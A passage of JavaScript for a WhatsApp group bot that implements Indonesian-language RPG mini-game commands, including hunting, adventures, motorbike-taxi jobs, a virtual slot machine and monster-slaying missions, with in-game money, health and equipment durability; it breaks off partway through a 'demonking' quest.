kurangAyam(m.sender, anu)
 addBalance(m.sender, duit1, balance)
 reply(`Transaksi Berhasil ✅\n*Sisa uang* : $${getBalance(m.sender, balance)}\n*Sisa Ayam* : ${getAyam(m.sender)}`)
 } else
 if (args[0] === 'kelinci'){
 if (isKelinci < anu) return m.reply(`Anda Tidak Memiliki Cukup Kelinci Untuk Transaksi Ini`)
 if (!args[1]) return m.reply(`Example : ${prefix + command} kelinci 2\n 1 Kelinci = 400 Money`)
let duit2 = 400 * anu
kurangKelinci(m.sender, anu)
 addBalance(m.sender, duit2, balance)
reply(`Transaksi Berhasil ✅\n*Sisa uang* : $${getBalance(m.sender, balance)}\n*Sisa kelinci* : ${getKelinci(m.sender)}`)
 } else
 if (args[0] === 'domba'){
 if (isDomba < anu) return m.reply(`Anda Tidak Memiliki Cukup Domba Untuk Transaksi Ini`)
 if (!args[1]) return m.reply(`Example : ${prefix + command} domba 2\n 1 Domba = 600 money`)
let duit3 = 600 * anu
kurangDomba(m.sender, anu)
 addBalance(m.sender, duit3, balance)
reply(`Transaksi Berhasil ✅\n*Sisa uang* : $${getBalance(m.sender, balance)}\n*Sisa domba* : ${getDomba(m.sender)}`)
 } else
 if (args[0] === 'sapi'){
 if (isSapi < anu) return m.reply(`Anda Tidak Memiliki Cukup Sapi Untuk Transaksi Ini`)
 if (!args[1]) return m.reply(`Example : ${prefix + command} sapi 2\n 1 Sapi = 900 Money`)
let duit4 = 900 * anu
kurangSapi(m.sender, anu)
 addBalance(m.sender, duit4, balance)
reply(`Transaksi Berhasil ✅\n*Sisa uang* : $${getBalance(m.sender, balance)}\n*Sisa sapi* : ${getSapi(m.sender)}`)
 } else
 if (args[0] === 'gajah'){
 if (isGajah < anu) return m.reply(`Anda Tidak Memiliki Cukup Gajah Untuk Transaksi Ini`)
 if (!args[1]) return m.reply(`Example : ${prefix + command} gajah 2\n 1 Gajah = 1200 Money`)
let duit5 = 1200 * anu
kurangGajah(m.sender, anu)
 addBalance(m.sender, duit5, balance)
reply(`Transaksi Berhasil ✅\n*Sisa uang* : $${getBalance(m.sender, balance)}\n*Sisa gajah* : ${getGajah(m.sender)}`)
 } else
 if (args[0] === 'besi'){
 if (isBesi < anu) return m.reply(`Anda Tidak Memiliki Cukup Besi Untuk Transaksi Ini`)
 if (!args[1]) return m.reply(`Example : ${prefix + command} besi 2\n 1 Besi = 2000 Money`)
let duit6 = 2000 * anu
kurangBesi(m.sender, anu)
 addBalance(m.sender, duit6, balance)
reply(`Transaksi berhasil ✅\n*Sisa uang* : $${getBalance(m.sender, balance)}\n*Sisa besi* : ${getBesi(m.sender)}`)
 } else
 if (args[0] === 'emas'){
 if (isEmas < anu) return m.reply(`Anda Tidak Memiliki Cukup Emas Untuk Transaksi Ini`)
 if (!args[1]) return m.reply(`Example : ${prefix + command} emas 2\n 1 Emas = 5000 Money`)
let duit7 = 5000 * anu
 kurangEmas(m.sender, anu)
 addBalance(m.sender, duit7, balance)
reply(`Transaksi berhasil ✅\n*Sisa uang* : $${getBalance(m.sender, balance)}\n*Sisa emas* : ${getEmas(m.sender)}`)
 } else
 if (args[0] === 'emerald'){
 if (isEmerald < anu) return m.reply(`Anda Tidak Memiliki Cukup Zamrud Untuk Transaksi Ini`)
 if (!args[1]) return m.reply(`Example : ${prefix + command} emerald 2\n 1 Emerald = 10000 Money`)
let duit8 = 10000 * anu
kurangEmerald(m.sender, anu)
 addBalance(m.sender, duit8, balance)
reply(`Transaksi berhasil ✅\n*Sisa uang* : $${getBalance(m.sender, balance)}\n*Sisa zamrud* : ${getEmerald(m.sender)}`)
 } else { 
reply(`Mau jual apa?\n- ikan\n- ayam\n- kelinci\n- domba\n- sapi\n- gajah\n- besi\n- emas\n- emerald\n\nContoh : ${prefix + command} ikan 2`)
 }
 }
 break*/
case 'heal': {
  if (!m.isGroup) return reply('Fitur Khusus Group!');
	let user = db.data.users[m.sender]
	if (user.health >= 100) return m.reply(`
Darah Kamu Masih Penuh!
`)
	const heal = 40 + (user.cat * 4)
	let count = Math.max(1, Math.min(Number.MAX_SAFE_INTEGER, (isNumber(args[0]) && parseInt(args[0]) || Math.round((100 - user.health) / heal)))) * 1
	if (user.potion < count) return m.reply(`
Potion Kamu Tidak Cukup, Kamu Hanya Punya *${user.potion}* 🥤Potion`)
	user.potion -= count * 1
	user.health += heal * count
	m.reply(`
Successful use of *${count}* 🥤Potion(s)
`)
  }
  break;
case 'hunt': 
case 'berburu':
case 'hunting': {
let user = db.data.users[m.sender]
let __timers = (new Date - user.lasthunt)
let _timers = (3600000 - __timers) 
let timers = clockString(_timers)
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (user.armor == 0 || user.sword == 0 || user.bow == 0) return m.reply(`Perlu *${prefix}craft* armor, sword, dan bow terlebih dahulu.\n\nAnda memiliki :\n━ 🥼 ${user.armor} Armor\n━ ⚔️ ${user.sword} Sword\n━ 🏹 ${user.bow} Bow`)
if (user.health < 40) return reply(`Dibutuhkan Setidaknya 50 Health Untuk ${command}\n\nKetik ${prefix}heal Untuk Menyembuhkan Darahmu`)
if (new Date - user.lasthunt > timers) {
let luka = ["Pierced by a thorn while hunting","Slipped into the abyss while hunting","Scratched by a wild animal","Not careful","Entangled in roots","Fall while hunting"]
let location = ["Jungle","Amazon forest","Tropical forest","Meadow","African forest","Mountains"]
var ikanmu = Math.ceil(Math.random() * 10)
var ayam = Math.ceil(Math.random() * 8)
var kelinci = Math.ceil(Math.random() * 7)
var dombanya = [3,0,4,0,5,4,6,0,1,0,2,3,0,3,0,1]
var sapinya = [2,0,3,0,4,0,5,0,1,0,2,0,3,0,1]
var gajahnya = [0,0,0,2,0,0,1,0,0,1,3,0,1]
var domba = dombanya[Math.floor(Math.random() * dombanya.length)] 
var sapi = sapinya[Math.floor(Math.random() * sapinya.length)] 
var gajah = gajahnya[Math.floor(Math.random() * gajahnya.length)]
var lukanya = luka[Math.floor(Math.random() * luka.length)]
var lokasinya = location[Math.floor(Math.random() * location.length)]
if (lokasinya === 'Jungle') {
var image = 'https://telegra.ph/file/92967f55b1f437fdd55fe.jpg'
} else
if (lokasinya === 'Amazon forest') {
var image = 'https://telegra.ph/file/2b9b53837d9f109862224.jpg'
} else
if (lokasinya === 'Tropical forest') {
var image = 'https://telegra.ph/file/bd662563855328a1832e6.jpg'
} else
if (lokasinya === 'Meadow') {
var image = 'https://telegra.ph/file/66435cf783e308b19927e.jpg'
} else
if (lokasinya === 'African forest') {
var image = 'https://telegra.ph/file/c5996d581846f70ed1514.jpg'
} else
if (lokasinya === 'Mountains') {
var image = 'https://telegra.ph/file/ca8f84d91ca3e1d5efa59.jpg'
}
 setTimeout( async () => {
let teksehmazeh = `_HUNT RESULT_\n\n`
 teksehmazeh += `*🐟Fish* : ${ikanmu}\n`
 teksehmazeh += `*🐔Chicken* : ${ayam}\n`
 teksehmazeh += `*🐇Rabbit* : ${kelinci}\n`
 teksehmazeh += `*🐑Sheep* : ${domba}\n`
 teksehmazeh += `*🐄Cow* : ${sapi}\n`
 teksehmazeh += `*🐘Elephant* : ${gajah}\n\n`
 teksehmazeh += `_INFO_\n`
 teksehmazeh += `*Location* : ${lokasinya}\n`
 teksehmazeh += `*Wounded* : ${lukanya}, blood - 15\n`
 teksehmazeh += `*Remaining blood* : ${user.health}\n`
await HuBotZ.sendMessage(m.chat, {image:{ url: image }, caption: teksehmazeh}, {quoted: m})
}, 5000)
 setTimeout( () => {
HuBotZ.sendTextWithMentions(m.chat, `@${m.sender.split("@")[0]} Started Hunting In ${lokasinya}`, m) 
}, 1000) 
user.ikan += ikanmu
user.ayam += ayam
user.kelinci += kelinci
user.domba += domba
user.sapi += sapi
user.gajah += gajah
 user.health -= 15
  	user.armordurability -= ranNumb(80, 120)
 	user.sworddurability -= ranNumb(80, 120)
 	user.bowdurability -= ranNumb(80, 120)
 	if (user.armordurability <= 0) {
 		user.armordurability = 0
 		user.armor = 0
 	}
 	if (user.sworddurability <= 0) {
 		user.sworddurability = 0
 		user.sword = 0
 	}
 	if (user.bowdurability <= 0) {
 		user.bowdurability = 0
 		user.bow = 0
 	}
 user.lasthunt = new Date() * 1;
 } else {
m.reply(`_*COOLDOWN*_\nKamu Sudah Melakukan Adventure\nMohon Tunggu *${timers}* Untuk Melakukan Adventure Lagi`)
}
 }
 break
case 'adventure': {
let user = db.data.users[m.sender]
let __timers = (new Date - user.lastadventure)
let _timers = (3600000 - __timers) 
let timers = clockString(_timers)
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (user.armor == 0 || user.sword == 0 || user.bow == 0) return m.reply(`Perlu *${prefix}craft* armor dan sword terlebih dahulu.\n\nAnda memiliki :\n━ 🥼 ${user.armor} Armor\n━ ⚔️ ${user.sword} Sword`)
if (user.health < 50) return reply(`Dibutuhkan Setidaknya 50 Health Untuk Adventure\n\nKetik ${prefix}heal Untuk Menyembuhkan Darahmu`)
if (new Date - user.lastadventure > timers) {
ngab = ['Avalanche','Volcanic Eruption','Tsunami','Earthquake','Meteor','Demon']
var sesuatu = ngab[Math.floor(Math.random() * ngab.length)]
var dungeon =['Whetstone','Willow Field','Rodeo','Verdant Blufs','Bull Holland','Fallen Tree','Dellnort','Verona Lush','Leafy Hollow','Chilliad Dome','Garcia','Pine Valley','Santa Florals','Guvero East','Cranbarry','Junever','Aldea Malvada','Green Palms','Green Oasis','Fort Carson','Prickel Pine','Pilson Meadow','Boca Roca','Rocksore East','Camel Toe','Hanky Panky','Fern Ridge','Montgomerry','Flint Yankton','Vespucci','fortress city', 'ravines valley', 'horizon valley', 'cyber city', 'end city', 'templar city', 'pochinki', 'peak','Vertical Zone','Sentainel Country','Night City','Flush City','Royals Canyon','Blackburn','Peterborough','Tarnstead','Jarren’s','Outpost','Landow','Nearon','Kincardine','Aysgarth','Veritas','Openshaw','Bredwardine','Berkton','Wolford','Norwich','Kald','Solaris','Kilead','Pitmerden','Acomb','Eldham','Warcester','Lingmell','Kilead','Cromerth','Wingston','Garmsby','Kingcardine','Perthlochry','Frostford','Hillford','Hardersfield','Tarrin','Holmfirth','Caerleon','Elisyum','Ballaeter','Penshaw','Bradford','Wigston','Accreton','Kameeraska','Ferncombe','Kilerth','Erostey','Carran','Jongvale','Larnwick','Queenstown','Whaelrdrake','Baerney','Wingston','Arkney','Strongfair','Lowestoft','Beggar’s Hole','Shepshed','Perthlochry','Ironforge','Tywardreath','Pontheugh','Foolshope','Hull','Dalmerlington','Aucteraden','Woodpine','Millstone','Windermere','Lancaster','Kirkwall','Rotherhithe','Astrakhan','Watford','Ritherhithe','Krosstoen','Pella’s','Wish','Grimsby','Ayrith','Ampleforth','Skystead','Eanverness','Penshaw','Peatsland','Astrakane','Pontybridge','Caershire','Snowbush','Sutton','Northwich','Hogsfeet','Claethorpes','Sudbury','Cherrytown','Blue Field','Orrinshire','Aempleforth','Garrigill','Jedburgh','Eastbourne','Taedmorden','Venzor','Grasmere','Ubbin','Falls','Violl’s Garden','Glanchester','Bailymena','Arkkukari','Skargness','Cardend','Llanybydder','Faversham','Yellowseed','Carlisle','Cirencester','Aramoor','Furness','Kincardine','Rotherham','Emelle','Boroughton','Carran','Ffestiniog','Mansfield','Huthwaite','Marclesfield','Pavv','Squall’s End','Glenarm','Dragontail','Moressley','Hardersfield','Gilramore','Aria','Ecrin','Clare View Point','Blackburn','Oakheart','Doonatel','Broughton','Carlisle','Murlayfield','Nuxvar']
var sesuatuu = dungeon[Math.floor(Math.random() * dungeon.length)]
hasm = "https://telegra.ph/file/ff94536d69e0f4f3e7b54.jpg"
var adven = Math.ceil(Math.random() * 1000)
var money = Math.ceil(Math.random() * 300)
let { key } = await HuBotZ.sendMessage(m.chat, { text: `*${pushname}* On An Adventure . . .` }, { quoted: m });
await sleep(3000);
const ps = [
    `Tiba-tiba Ada ${sesuatu}`
];
for (let i = 0; i < ps.length; i++) {
await HuBotZ.sendMessage(m.chat, { text: ps[i], edit: key });
};
await sleep(5000);
HuBotZ.sendMessage(m.chat, { text: 'Awasss . . .', edit: key});
await sleep(7000);
var hg = `「 DEATH 」\n\n *┊ Place* ${sesuatuu}\n ┊ *MONEY :* $${money}\n ┊ *EXP :* ${adven}Xp`
user.exp += adven
user.money += money
user.health -= 30
user.lastadventure = new Date() * 1;
user.armordurability -= ranNumb(80, 120)
user.sworddurability -= ranNumb(80, 120)
if (user.armordurability <= 0) {
user.armordurability = 0
user.armor = 0
}
if (user.sworddurability <= 0) {
user.sworddurability = 0
user.sword = 0
}
HuBotZ.sendMessage(m.chat, { image: { url:hasm }, caption: hg }, { quoted: m })
} else {
m.reply(`_*COOLDOWN*_\nKamu Sudah Melakukan Adventure\nMohon Tunggu *${timers}* Untuk Melakukan Adventure Lagi`)
}
}
break
case 'ojek': case 'ngojek': {
let user = db.data.users[m.sender]
let __timers = (new Date - user.lastngojek)
let _timers = (300000 - __timers) 
let timers = clockString(_timers)
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (new Date - user.lastngojek > timers) {
var adven = Math.ceil(Math.random() * 1000)
var money = Math.ceil(Math.random() * 300)
let { key } = await HuBotZ.sendMessage(m.chat, { text: `*${pushname}* Mencari Pelanggan. . .` }, { quoted: m });
await sleep(3000);
const psn = [
    `*${pushname}* Mendapatkan Orderan. . .`
];
for (let i = 0; i < psn.length; i++) {
await HuBotZ.sendMessage(m.chat, { text: psn[i], edit: key });
};
await sleep(5000);
HuBotZ.sendMessage(m.chat, { text: `
🚶🛵⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬜⬛⬜⬜⬜⬛⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
🏘️🏘️🏘️🏘️🌳  🌳 🏘️       

➕ Mengantar ke tujuan....`,
 edit: key});
await sleep(7000);
HuBotZ.sendMessage(m.chat, { text: `
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬛⬛⬜⬜⬜⬛⬛
⬛⬛⬛⬛⬛⬛⬛🛵⬛⬛
🏘️🏘️🏘️🏘️🌳  🌳 🏘️       


➕ Sampai di tujuan...`,
 edit: key});
await sleep(9000);
HuBotZ.sendMessage(m.chat, { text: `${pushname} ➕ 💹Menerima gaji....`, edit: key});
await sleep(10000);
var hg = `
*—[ Hasil Ngojek ${pushname} ]—*
 ➕ 💹 Uang = [ ${money} ]
 ➕ ✨ Exp = [ ${adven} ]	 
 ➕ 😍 Order Selesai = +1
`
HuBotZ.sendMessage(m.chat, { text: `${hg}`, edit: key});
user.exp += adven
user.money += money
user.lastngojek = new Date() * 1
} else {
m.reply(`_*COOLDOWN*_\nKamu Sudah Ngojek\nMohon Tunggu *${timers}* Untuk Ngojek Lagi`)
}
}
break
case 'luckyday':
case 'luckytime': {
let user = db.data.users[m.sender]
let __timers = (new Date - user.lastluck)
let _timers = (300000 - __timers) 
let timers = clockString(_timers)
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (new Date - user.lastluck > 3600000) {
ez = Math.ceil(Math.random() * 450)
a = randomNomor(20)
b = randomNomor(50)
c = randomNomor(300)
user.exp += ez
user.gold += a
user.iron += b
user.money += c
user.lastluck = new Date() * 1;
newReply(`🎰 *Lucky*\n┊ *Money:* $${c}\n┊ *Gold :* ${a}\n┊ *Iron :* ${b}\n┊ *XP :* ${ez}`)
} else {
m.reply(`⏳ Kamu sudah melakukan Spin Akhir Ini! Silakan tunggu *${timers} Lagi*`);
}
}
break
case 'slot':
case 'judi': {
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
    let user = db.data.users[m.sender]
    HuBotZ.slots = HuBotZ.slots ? HuBotZ.slots : {}
    if (m.chat in HuBotZ.slots) return m.reply('Masih ada Yang Melakukan Slots Disini, Tunggu Sampai selesai!!')
    else HuBotZ.slots[m.chat] = true
    try {
        if (!text) return m.reply(`
        Gunakan format *${prefix + command} [jumlah]*
        Example *${prefix + command} 1000*`)
        if (!text || isNaN(text)) return reply(`Jangan Pake Huruf Ngab!\nExample ${prefix + command} 1000`)
        let count = parseInt(text);
        if ( user.money <= count ) return reply(`Maaf *${pushname}* Money Kamu Belum Cukup!\nUntuk Melakukan ${command} Sebanyak *${count}*`)
        let _spin1 = pickRandom(['1', '2', '3', '4', '5'])
        let _spin2 = pickRandom(['1', '2', '3', '4', '5'])
        let _spin3 = pickRandom(['1', '2', '3', '4', '5'])
        let _spin4 = pickRandom(['1', '2', '3', '4', '5'])
        let _spin5 = pickRandom(['1', '2', '3', '4', '5'])
        let _spin6 = pickRandom(['1', '2', '3', '4', '5'])
        let _spin7 = pickRandom(['1', '2', '3', '4', '5'])
        let _spin8 = pickRandom(['1', '2', '3', '4', '5'])
        let _spin9 = pickRandom(['1', '2', '3', '4', '5'])
        let spin1 = (_spin1 * 1)
        let spin2 = (_spin2 * 1)
        let spin3 = (_spin3 * 1)
        let spin4 = (_spin4 * 1)
        let spin5 = (_spin5 * 1)
        let spin6 = (_spin6 * 1)
        let spin7 = (_spin7 * 1)
        let spin8 = (_spin8 * 1)
        let spin9 = (_spin9 * 1)
        let spins1 = (spin1 == 1 ? '🍊' : spin1 == 2 ? '🍇' : spin1 == 3 ? '🍉' : spin1 == 4 ? '🍌' : spin1 == 5 ? '🍍' : '')
        let spins2 = (spin2 == 1 ? '🍊' : spin2 == 2 ? '🍇' : spin2 == 3 ? '🍉' : spin2 == 4 ? '🍌' : spin2 == 5 ? '🍍' : '')
        let spins3 = (spin3 == 1 ? '🍊' : spin3 == 2 ? '🍇' : spin3 == 3 ? '🍉' : spin3 == 4 ? '🍌' : spin3 == 5 ? '🍍' : '')
        let spins4 = (spin4 == 1 ? '🍊' : spin4 == 2 ? '🍇' : spin4 == 3 ? '🍉' : spin4 == 4 ? '🍌' : spin4 == 5 ? '🍍' : '')
        let spins5 = (spin5 == 1 ? '🍊' : spin5 == 2 ? '🍇' : spin5 == 3 ? '🍉' : spin5 == 4 ? '🍌' : spin5 == 5 ? '🍍' : '')
        let spins6 = (spin6 == 1 ? '🍊' : spin6 == 2 ? '🍇' : spin6 == 3 ? '🍉' : spin6 == 4 ? '🍌' : spin6 == 5 ? '🍍' : '')
        let spins7 = (spin7 == 1 ? '🍊' : spin7 == 2 ? '🍇' : spin7 == 3 ? '🍉' : spin7 == 4 ? '🍌' : spin7 == 5 ? '🍍' : '')
        let spins8 = (spin8 == 1 ? '🍊' : spin8 == 2 ? '🍇' : spin8 == 3 ? '🍉' : spin8 == 4 ? '🍌' : spin8 == 5 ? '🍍' : '')
        let spins9 = (spin9 == 1 ? '🍊' : spin9 == 2 ? '🍇' : spin9 == 3 ? '🍉' : spin9 == 4 ? '🍌' : spin9 == 5 ? '🍍' : '')
        user.money -= Math.ceil(count * 1)
        for (let i = 0; i < 3; i++) {
            m.reply(`
            *🎰VIRTUAL SLOTS🎰*
            
${pickRandom(['🍊', '🍇', '🍉', '🍌', '🍍'])}|${pickRandom(['🍊', '🍇', '🍉', '🍌', '🍍'])}|${pickRandom(['🍊', '🍇', '🍉', '🍌', '🍍'])}
${pickRandom(['🍊', '🍇', '🍉', '🍌', '🍍'])}|${pickRandom(['🍊', '🍇', '🍉', '🍌', '🍍'])}|${pickRandom(['🍊', '🍇', '🍉', '🍌', '🍍'])} <<==
${pickRandom(['🍊', '🍇', '🍉', '🍌', '🍍'])}|${pickRandom(['🍊', '🍇', '🍉', '🍌', '🍍'])}|${pickRandom(['🍊', '🍇', '🍉', '🍌', '🍍'])}
            
            `)
        }
        let WinOrLose, Hadiah
        if (spin1 == spin2 && spin2 == spin3 && spin3 == spin4 && spin4 == spin5 && spin5 == spin6 && spin6 == spin7 && spin7 == spin8 && spin8 == spin9) {
            WinOrLose = 'BIG JACKPOT🥳🥳'
            Hadiah = `+${Math.ceil(count * 4)}`
            user.money += Math.ceil(count * 4)
        } else if (spin4 == spin5 && spin5 == spin6) {
            WinOrLose = 'JACKPOT🥳'
            Hadiah = `+${Math.ceil(count * 2)}`
            user.money += Math.ceil(count * 2)
        } else if ((spin1 == spin2 && spin2 == spin3) || (spin7 == spin8 && spin8 == spin9)) {
            Hadiah = `-${Math.ceil(count * 1)}`
            WinOrLose = 'DIKIT LAGI!!'
        } else {
            Hadiah = `-${Math.ceil(count * 1)}`
            WinOrLose = 'YOU LOSE'
            user.money -= count
        }
        reply(`
       *🎰VIRTUAL SLOTS🎰*

${spins1}|${spins2}|${spins3}
${spins4}|${spins5}|${spins6} <<==
${spins7}|${spins8}|${spins9}

*${WinOrLose}* *${Hadiah}*
`)
    } catch (e) {
        console.log(e)
        reply('Error')
    } finally {
        delete HuBotZ.slots[m.chat]
    }
}
break
case 'slime':
case 'killslime': {
let user = db.data.users[m.sender]
let __timers = (new Date - user.lastkillslime)
let _timers = (300000 - __timers) 
let timers = clockString(_timers)
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (user.sword == 0 || user.armor == 0) {
  return m.reply(`Kamu Perlu Craft *sword, dan armor* Agar bisa membunuh slime!`);
}
if (user.health < 55) return reply(`Kamu Lelah!, Coba Sembuhkan Menggunakan Ramuan`)
if (new Date - user.lastkillslime > timers) {
ez = Math.ceil(Math.random() * 400)
a = randomNomor(10)
b = randomNomor(400)
c = randomNomor(80)
user.exp += ez
user.gold += a
user.money += b
user.iron += c
user.health -= 15
user.lastkillslime = new Date() * 1;
user.armordurability -= ranNumb(80, 120)
user.sworddurability -= ranNumb(80, 120)
if (user.armordurability <= 0) {
user.armordurability = 0
user.armor = 0
}
if (user.sworddurability <= 0) {
user.sworddurability = 0
user.sword = 0
}
let pepekasw = "https://telegra.ph/file/c34a444fa8824d8bb6e18.jpg"
var hg = `*Misi kill Slime*\n\n🎁 *Hadiah untuk killing Slime*\n ┊ *Money:* $${b}\n ┊ *Iron:* ${c}\n ┊ *Gold:* ${a}\n ┊ *XP:* ${ez}\n\n*Terima kasih telah menjalankan misi ini*`
HuBotZ.sendMessage(m.chat, { image: { url: pepekasw }, caption: hg }, { quoted: m })
} else {
m.reply(`⏳ Kamu sudah membunuh Slime! Silakan tunggu *${timers} Lagi*`);
}
}
break
case 'goblin':
case 'killgoblin': {
let user = db.data.users[m.sender]
let __timers = (new Date - user.lastkillgoblin)
let _timers = (300000 - __timers) 
let timers = clockString(_timers)
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (user.sword == 0 || user.armor == 0) {
  return m.reply(`Kamu Perlu Craft *sword, dan armor* Agar bisa membunuh goblin!`);
}
if (user.health < 55) return reply(`Kamu Lelah!, Coba Sembuhkan Menggunakan Ramuan`)
if (new Date - user.lastkillgoblin > timers) {
ez = Math.ceil(Math.random() * 500)
a = randomNomor(10)
b = randomNomor(500)
c = randomNomor(90)
user.exp += ez
user.gold += a
user.money += b
user.iron += c
user.health -= 25
user.lastkillgoblin = new Date() * 1;
user.armordurability -= ranNumb(80, 120)
user.sworddurability -= ranNumb(80, 120)
if (user.armordurability <= 0) {
user.armordurability = 0
user.armor = 0
}
if (user.sworddurability <= 0) {
user.sworddurability = 0
user.sword = 0
}
let bufo = "https://telegra.ph/file/19bdc38aaafda29f7afe1.jpg"
var hg = `*Misi kill Goblin*\n\n🎁 *Hadiah untuk killing Goblin*\n ┊ *Money:* $${b}\n ┊ *Iron:* ${c}\n ┊ *Gold:* ${a}\n ┊ *XP:* ${ez}\n\n*Terima kasih telah menjalankan misi ini*`
HuBotZ.sendMessage(m.chat, {image:{url:bufo},caption: hg} , {quoted:m})
} else {
m.reply(`⏳ Kamu sudah membunuh Goblin! Silakan tunggu *${timers} Lagi*`);
}
}
break
case 'devil':
case 'killdevil': {
let user = db.data.users[m.sender]
let __timers = (new Date - user.lastkilldevil)
let _timers = (300000 - __timers) 
let timers = clockString(_timers)
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (user.sword == 0 || user.armor == 0) {
  return m.reply(`Kamu Perlu Craft *sword, dan armor* Agar bisa membunuh devil!`);
}
if (user.health < 55) return reply(`Kamu Lelah!, Coba Sembuhkan Menggunakan Ramuan`)
if (new Date - user.lastkilldevil > timers) {
ez = Math.ceil(Math.random() * 600)
a = randomNomor(15)
b = randomNomor(600)
c = randomNomor(95)
user.exp += ez
user.gold += a
user.money += b
user.iron += c
user.health -= 30
user.lastkilldevil = new Date() * 1;
user.armordurability -= ranNumb(80, 120)
user.sworddurability -= ranNumb(80, 120)
if (user.armordurability <= 0) {
user.armordurability = 0
user.armor = 0
}
if (user.sworddurability <= 0) {
user.sworddurability = 0
user.sword = 0
}
let bufas = "https://telegra.ph/file/dbecd2f871988f52bf555.jpg"
var hg = `*Misi kill Devil*\n\n🎁 *Hadiah untuk killing Devil*\n ┊ *Money:* $${b}\n ┊ *Iron:* ${c}\n ┊ *Gold:* ${a}\n ┊ *XP:* ${ez}\n\n*Terima kasih telah menjalankan misi ini*`
HuBotZ.sendMessage(m.chat, {image:{url:bufas},caption: hg} , {quoted:m})
} else {
m.reply(`⏳ Kamu sudah membunuh Devil! Silakan tunggu *${timers} Lagi*`);
}
}
break
case 'behemoth':
case 'killbehemoth': {
let user = db.data.users[m.sender]
let __timers = (new Date - user.lastkillbehemoth)
let _timers = (300000 - __timers) 
let timers = clockString(_timers)
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (user.sword == 0 || user.armor == 0) {
  return m.reply(`Kamu Perlu Craft *sword, dan armor* Agar bisa membunuh behemonth!`);
}
if (user.health < 55) return reply(`Kamu Lelah!, Coba Sembuhkan Menggunakan Ramuan`)
if (new Date - user.lastkillbehemoth > timers) {
ez = Math.ceil(Math.random() * 700)
a = randomNomor(20)
b = randomNomor(600)
c = randomNomor(100)
user.exp += ez
user.gold += a
user.money += b
user.iron += c
user.health -= 20
user.lastkillbehemoth = new Date() * 1;
user.armordurability -= ranNumb(80, 120)
user.sworddurability -= ranNumb(80, 120)
if (user.armordurability <= 0) {
user.armordurability = 0
user.armor = 0
}
if (user.sworddurability <= 0) {
user.sworddurability = 0
user.sword = 0
}
let batai = "https://telegra.ph/file/43259a7d8accff8b627c0.jpg"
var hg = `*Misi kill Behemoth*\n\n🎁 *Hadiah untuk kiling Behemoth*\n ┊ *Money:* $${b}\n ┊ *Iron:* ${c}\n ┊ *Gold:* ${a}\n ┊ *XP:* ${ez}\n\n*Terima kasih telah menjalankan misi ini*`
HuBotZ.sendMessage(m.chat, {image:{url:batai},caption: hg} , {quoted:m})
} else {
m.reply(`⏳ Kamu sudah membunuh Behemoth! Silakan tunggu *${timers} Lagi*`);
}
}
break
case 'demon':
case 'killdemon': {
let user = db.data.users[m.sender]
let __timers = (new Date - user.lastkilldemon)
let _timers = (300000 - __timers) 
let timers = clockString(_timers)
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (user.sword == 0 || user.armor == 0) {
  return m.reply(`Kamu Perlu Craft *sword, dan armor* Agar bisa membunuh demon!`);
}
if (user.health < 60) return reply(`Kamu Lelah!, Coba Sembuhkan Menggunakan Ramuan`)
if (new Date - user.lastkilldemon > timers) {
ez = Math.ceil(Math.random() * 850)
a = randomNomor(20)
b = randomNomor(900)
c = randomNomor(120)
user.exp += ez
user.gold += a
user.money += b
user.iron += c
user.health -= 20
user.lastkilldemon = new Date() * 1;
user.armordurability -= ranNumb(80, 120)
user.sworddurability -= ranNumb(80, 120)
if (user.armordurability <= 0) {
user.armordurability = 0
user.armor = 0
}
if (user.sworddurability <= 0) {
user.sworddurability = 0
user.sword = 0
}
let bhuu = "https://telegra.ph/file/4a264a10ea2e5f18314f1.jpg"
var hg = `*Misi kill Demon*\n🎁 *Demon Kill Reward*\n ┊ *Money:* $${b}\n ┊ *Iron:* ${c}\n ┊ *Gold*: ${a}\n ┊ *XP:* ${ez}\n\n*Terima Kasih Telah Melaksanakan Misi Ini*`
HuBotZ.sendMessage(m.chat, {image:{url:bhuu},caption: hg} , {quoted:m})
} else {
m.reply(`⏳ Kamu sudah membunuh Demon! Silakan tunggu *${timers} Lagi*`);
}
}
break
case 'demonking':
case 'killdemonking': {
let user = db.data.users[m.sender]
let __timers = (new Date - user.lastkilldemonking)
let _timers = (3600000 - __timers) 
let timers = clockString(_timers)
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (user.sword == 0 || user.armor == 0) {
  return m.reply(`Kamu Perlu Craft *sword, dan armor* Agar bisa berduel dengan demonking!`);
}
if (user.health < 65) return reply(`Kamu Lelah!, Coba Sembuhkan Menggunakan Ramuan`)
if (new Date - user.lastkilldemonking > timers) {
ez = Math.ceil(Math.random() * 1000)
a = randomNomor(7500)
b = randomNomor(500)
c = randomNomor(750)
d = randomNomor(10)
let { key } = await HuBotZ.sendMessage(m.chat, { text: `*${pushname}* Datang Kesebuah Kastil Yang Sudah Lama Ditinggalkan. . .` }, { quoted: m });
await sleep(3000);
const message = [
    `*${pushname}* Mulai Berkeliling Di Area Kastil Tua Tersebut. . .`
];
for (let i = 0; i < message.length; i++) {
await HuBotZ.sendMessage(m.chat, {text: message[i], edit: key });
};
await sleep(3000);
HuBotZ.sendMessage(m.chat, { text: `*${pushname}* Menemukan Sebuah Mahkota Emas. . .`, edit: key});
await sleep(3000);
HuBotZ.sendMessage(m.chat, { text: `*${pushname}* Mencoba Mengambil Mahkota Tersebut. . .`, edit: key});
await sleep(3000);
HuBotZ.sendMessage(m.chat, { text: `Dan Tiba-tiba Muncul Goblin King dan Langsung Menyerang *${pushname}*. . .`, edit: key});
await sleep(3000);
HuBotZ.sendMessage(m.chat, { text: `*${pushname}* Langsung Melawan Mahluk Tersebut. . .`, edit: key});
await sleep(3000);
HuBotZ.sendMessage(m.chat, { text: `Dan Terjadi Pertarungan Epik Antara *Goblin King* dan *${pushname}*. . .`, edit: key});
await sleep(3000);
HuBotZ.sendMessage(m.chat, { text: `*${pushname}* Kalah Oleh *Goblin King*. . .`, edit: key});
await sleep(3000);
